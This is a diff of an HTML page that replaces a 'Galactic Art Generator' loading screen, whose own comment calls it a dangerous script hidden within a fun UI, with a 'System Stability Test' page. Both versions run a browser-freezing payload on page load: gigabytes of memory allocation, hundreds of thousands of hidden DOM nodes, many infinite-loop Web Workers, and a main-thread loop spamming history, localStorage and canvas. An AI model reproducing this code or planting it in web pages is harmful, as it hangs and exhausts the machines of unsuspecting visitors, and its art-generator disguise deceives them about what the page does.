@@ -1,235 +1,149 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Galactic Art Generator - Loading...</title>
+    <title>System Stability Test - Stage 5</title>
     <meta charset="UTF-8">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
-
-        body {
-            margin: 0;
-            overflow: hidden;
-            background: linear-gradient(to bottom, #000020, #100030, #200040);
-            color: #fff;
-            font-family: 'Orbitron', sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            text-align: center;
-        }
-
-        h1 {
-            font-size: 3em;
-            color: #00ffff; /* Cyan */
-            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
-            margin-bottom: 10px;
-            animation: pulse 2s infinite alternate;
-        }
-
-        p {
-            font-size: 1.2em;
-            color: #ff00ff; /* Magenta */
-            text-shadow: 0 0 5px #ff00ff;
-            margin-bottom: 30px;
-        }
-
-        .loader {
-            width: 80%;
-            max-width: 500px;
-            height: 30px;
-            background-color: #333;
-            border-radius: 15px;
-            overflow: hidden;
-            border: 2px solid #00ffff;
-            box-shadow: 0 0 15px #00ffff inset;
-            margin-bottom: 20px;
-        }
-
-        .loader-bar {
-            width: 0%; /* Starts at 0, JS won't update it before freeze */
-            height: 100%;
-            background: linear-gradient(90deg, #ff00ff, #00ffff);
-            border-radius: 15px;
-            animation: loading-animation 10s linear infinite; /* CSS animation will run until freeze */
-        }
-
-        canvas {
-            display: block;
-            margin: 20px auto;
-            border: 2px dashed #ff00ff;
-            box-shadow: 0 0 10px #ff00ff;
-            background-color: rgba(0,0,0,0.5);
-        }
-
-        .status-text {
-            font-size: 0.9em;
-            color: #aaa;
-            margin-top: 10px;
-        }
-
-        /* CSS Animations (will run until JS locks the thread) */
-        @keyframes pulse {
-            from { transform: scale(1); text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff; }
-            to { transform: scale(1.05); text-shadow: 0 0 15px #00ffff, 0 0 30px #00ffff; }
-        }
-
-        @keyframes loading-animation {
-            0% { width: 0%; background: linear-gradient(90deg, #ff00ff, #00ffff); }
-            50% { width: 100%; background: linear-gradient(90deg, #00ffff, #ff00ff); }
-            100% { width: 0%; background: linear-gradient(90deg, #ff00ff, #00ffff); }
-        }
-
-        /* Add some fake stars */
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background-image: radial-gradient(#fff 1px, transparent 1px),
-                              radial-gradient(#fff 1px, transparent 1px);
-            background-size: 50px 50px, 150px 150px;
-            background-position: 0 0, 75px 75px;
-            animation: stars-move 60s linear infinite;
-            opacity: 0.3;
-            z-index: -1;
-        }
-
-        @keyframes stars-move {
-            from { background-position: 0 0, 75px 75px; }
-            to { background-position: 500px 1000px, 575px 1075px; }
-        }
-
+        body { margin: 0; overflow: hidden; background-color: #111; color: #eee; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        h1 { color: #f44; text-shadow: 0 0 8px #f00; }
+        p { color: #ff5; }
+        .status { margin-top: 20px; font-size: 0.9em; color: #999; }
+        #debugCanvas { border: 1px solid #555; margin-top: 10px; background: #222; }
     </style>
 </head>
 <body>
 
-    <h1>Galactic Art Generator</h1>
-    <p>Initializing Hyper-Render Engine...</p>
-
-    <div class="loader">
-        <div class="loader-bar"></div>
-    </div>
-
-    <p class="status-text">Loading cosmic textures and stellar data...</p>
-
-    <canvas id="renderCanvas" width="300" height="150"></canvas>
-    <p class="status-text">Rendering preview...</p>
+    <h1>Stability Test Initializing...</h1>
+    <p>Preparing maximum load simulation.</p>
+    <canvas id="debugCanvas" width="200" height="50"></canvas>
+    <div class="status" id="status-log">Status: Starting...</div>
 
     <script>
     // ==========================================================================
-    // WARNING: EXTREMELY DANGEROUS SCRIPT (Hidden within a fun UI)
-    // This script is designed to cause an immediate, severe freeze and make the
-    // browser process incredibly difficult to terminate. It will consume vast
-    // amounts of CPU, RAM, and other resources.
-    // USE ONLY IN ISOLATED VIRTUALIZED ENVIRONMENTS FOR TESTING PURPOSES.
-    // You WILL need to force-quit the browser process via Task Manager/Activity Monitor.
+    // REFINED FREEZE SCRIPT - Focus on Core Lock & Diagnostics
     // ==========================================================================
 
-    console.log("--- Galactic Art Generator: Initiating Stress Test Sequence ---");
+    const statusLog = document.getElementById('status-log');
+    function updateStatus(message) {
+        console.log(message); // Log to console
+        if (statusLog) {
+            statusLog.textContent = `Status: ${message}`; // Update visible status
+        }
+    }
 
-    // --- Configuration (Same as ultimate_freeze) ---
-    const INITIAL_MEMORY_STRINGS = 15 * 1000 * 1000; // Aim for ~15 million strings (~15GB+)
-    const INITIAL_DOM_ELEMENTS = 1 * 1000 * 1000;   // 1 million DOM elements (will be hidden/tiny)
-    const NUM_WORKERS_TO_SPAWN = navigator.hardwareConcurrency ? navigator.hardwareConcurrency * 4 : 16; // Spawn many workers
+    updateStatus("Script loaded. Starting Phase 1.");
 
-    // --- Phase 1: Massive Initial Resource Allocation ---
+    // --- Configuration (Slightly reduced initial load for debugging) ---
+    const INITIAL_MEMORY_STRINGS = 5 * 1000 * 1000;   // ~5 million strings (~5GB)
+    const INITIAL_DOM_ELEMENTS = 500 * 1000;         // 0.5 million DOM elements
+    const NUM_WORKERS_TO_SPAWN = navigator.hardwareConcurrency ? navigator.hardwareConcurrency * 2 : 8; // Still aim for more workers than cores
 
+    // --- Phase 1: Initial Resource Allocation ---
     let initialMemoryHog = [];
-    console.log(`Phase 1a: Allocating initial memory (${INITIAL_MEMORY_STRINGS} strings)...`);
+    updateStatus(`Phase 1a: Allocating ${INITIAL_MEMORY_STRINGS} initial memory strings...`);
     try {
         for (let i = 0; i < INITIAL_MEMORY_STRINGS; i++) {
-            initialMemoryHog.push(new Array(1000).join('X') + Math.random());
+            initialMemoryHog.push(new Array(1000).join('M') + Math.random());
         }
-        console.log("Phase 1a: Initial memory allocation attempt complete.");
+        updateStatus("Phase 1a: Initial memory allocation complete.");
     } catch (e) {
-        console.error("Phase 1a: Error during initial memory allocation (likely hit limit):", e);
+        updateStatus(`Phase 1a: Error during initial memory allocation: ${e.message}`);
         initialMemoryHog = null;
     }
 
-    console.log(`Phase 1b: Creating ${INITIAL_DOM_ELEMENTS} hidden DOM elements...`);
+    updateStatus(`Phase 1b: Creating ${INITIAL_DOM_ELEMENTS} hidden DOM elements...`);
     const body = document.body;
     try {
         const fragment = document.createDocumentFragment();
         for (let i = 0; i < INITIAL_DOM_ELEMENTS; i++) {
             const div = document.createElement('div');
-            // Make elements hidden and minimal to not interfere visually
-            div.style.cssText = 'position:absolute;width:0;height:0;overflow:hidden;opacity:0;';
+            div.style.cssText = 'position:absolute;width:0;height:0;overflow:hidden;';
             fragment.appendChild(div);
         }
         body.appendChild(fragment);
-        console.log("Phase 1b: Hidden DOM element creation attempt complete.");
+        updateStatus("Phase 1b: DOM element creation complete.");
     } catch (e) {
-        console.error("Phase 1b: Error during DOM creation:", e);
+        updateStatus(`Phase 1b: Error during DOM creation: ${e.message}`);
     }
 
     // --- Phase 2: Saturate CPU Cores with Web Workers ---
-
-    console.log(`Phase 2: Spawning ${NUM_WORKERS_TO_SPAWN} Web Workers for CPU saturation...`);
-    const workerCode = `while (true) {}`; // Simplest infinite loop for workers
+    updateStatus(`Phase 2: Spawning ${NUM_WORKERS_TO_SPAWN} Web Workers...`);
+    const workerCode = `
+        // Worker: Simple infinite loop
+        console.log('Worker thread started. Entering infinite loop.');
+        let i = 0;
+        while(true) {
+            i++;
+            // Prevent potential runaway counter issues (though unlikely needed)
+            if (i > Number.MAX_SAFE_INTEGER) i = 0;
+        }
+    `;
     const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
     const workerUrl = URL.createObjectURL(workerBlob);
     let workers = [];
+    let workersLaunched = 0;
     for (let i = 0; i < NUM_WORKERS_TO_SPAWN; i++) {
         try {
             const worker = new Worker(workerUrl);
+            // Add error listener *before* potential freeze
+            worker.onerror = (event) => {
+                console.error(`WORKER ${i} ERROR:`, event.message, event.filename, event.lineno);
+                updateStatus(`Error in Worker ${i}: ${event.message}`);
+            };
             workers.push(worker);
+            workersLaunched++;
         } catch (e) {
+            updateStatus(`CRITICAL: Failed to create worker ${i}: ${e.message}`);
             console.error(`Failed to create worker ${i}:`, e);
         }
     }
-    console.log(`Phase 2: ${workers.length} workers launched.`);
+    updateStatus(`Phase 2: ${workersLaunched} of ${NUM_WORKERS_TO_SPAWN} workers launched.`);
 
-    // --- Phase 3: Main Thread Infinite Loop with Continuous Stress ---
+    // --- Phase 3: Main Thread Infinite Loop ---
+    updateStatus("Phase 3: Preparing to enter MAIN THREAD infinite loop...");
 
-    console.log("Phase 3: Entering main thread infinite loop with continuous resource drain...");
-    let continuousMemory = [];
-    let historyCounter = 0;
-    let storageCounter = 0;
-    const canvas = document.getElementById('renderCanvas');
-    const ctx = canvas.getContext('2d', { alpha: false });
-    const largeStringForStorage = new Array(1024 * 10).join('S'); // ~10KB string
+    // Add a very short delay (e.g., 10ms) JUST before the infinite loop.
+    // This gives the browser a tiny moment to process the final status update/logs
+    // and ensures worker spawning has fully initiated.
+    setTimeout(() => {
+        updateStatus("ENTERING MAIN THREAD INFINITE LOOP NOW!");
+        console.log("!!! ENTERING MAIN THREAD INFINITE LOOP NOW !!!");
 
-    while (true) {
-        // 3a: Continuous Memory Allocation
-        try {
-            continuousMemory.push(new Array(500).join('C') + Math.random());
-        } catch (e) { /* Ignore */ }
+        // Declare variables used inside loop *outside* for clarity
+        let continuousMemory = [];
+        let historyCounter = 0;
+        let storageCounter = 0;
+        const canvas = document.getElementById('debugCanvas');
+        const ctx = canvas ? canvas.getContext('2d', { alpha: false }) : null;
+        const largeStringForStorage = new Array(1024 * 5).join('S'); // ~5KB string
 
-        // 3b: Continuous History API Spam (replaceState)
-        try {
-            history.replaceState(null, '', `#render-${historyCounter++}-${Math.random().toString(36).substring(2)}`);
-        } catch (e) { /* Ignore */ }
+        // The core freeze mechanism
+        while (true) {
+            // Keep the continuous stress operations inside the main loop
+            // 3a: Continuous Memory
+            try { continuousMemory.push('M' + Math.random()); } catch (e) {}
+            // 3b: History Spam
+            try { history.replaceState(null, '', `#${historyCounter++}`); } catch (e) {}
+            // 3c: Storage Spam
+            try { localStorage.setItem(`stress_${storageCounter++ % 100}`, largeStringForStorage); } catch (e) {}
+            // 3d: Canvas Spam
+            try {
+                if (ctx) {
+                    ctx.fillStyle = `rgb(${historyCounter%255},${storageCounter%255},${continuousMemory.length%255})`;
+                    ctx.fillRect(Math.random() * 200, Math.random() * 50, 5, 5);
+                }
+            } catch(e) {}
 
-        // 3c: Continuous localStorage Spam
-        try {
-            localStorage.setItem(`galaxy_chunk_${storageCounter++ % 500}`, largeStringForStorage + storageCounter);
-        } catch (e) { /* Ignore */ }
+            // Add a simple counter increment to ensure the loop body isn't completely empty
+            historyCounter++; // Re-incrementing is fine, just adds work
+        }
 
-        // 3d: Continuous Canvas Drawing Stress (Looks like "rendering")
-        try {
-            const width = canvas.width;
-            const height = canvas.height;
-            for (let i = 0; i < 50; i++) { // Draw multiple shapes per frame
-                 ctx.fillStyle = `rgba(${Math.random()*255|0},${Math.random()*255|0},${Math.random()*255|0}, 0.5)`; // Semi-transparent random colors
-                 ctx.beginPath();
-                 ctx.arc(Math.random() * width, Math.random() * height, Math.random() * 10, 0, Math.PI * 2); // Draw circles (planets/stars)
-                 ctx.fill();
-            }
-            // Add some lines (nebula trails?)
-            ctx.strokeStyle = `rgba(${Math.random()*255|0},${Math.random()*255|0},${Math.random()*255|0}, 0.3)`;
-            ctx.lineWidth = Math.random() * 3;
-            ctx.beginPath();
-            ctx.moveTo(Math.random() * width, Math.random() * height);
-            ctx.lineTo(Math.random() * width, Math.random() * height);
-            ctx.stroke();
+        // Unreachable
+        updateStatus("ERROR: Exited infinite loop (IMPOSSIBLE)");
 
-        } catch(e) { /* Ignore */ }
-    }
+    }, 10); // 10 millisecond delay before the freeze
 
-    // Unreachable code
-    console.log("--- Galactic Art Generator: Sequence Completed (IMPOSSIBLE) ---");
+    updateStatus("Script execution nominally complete (before final timeout).");
 
     </script>
 
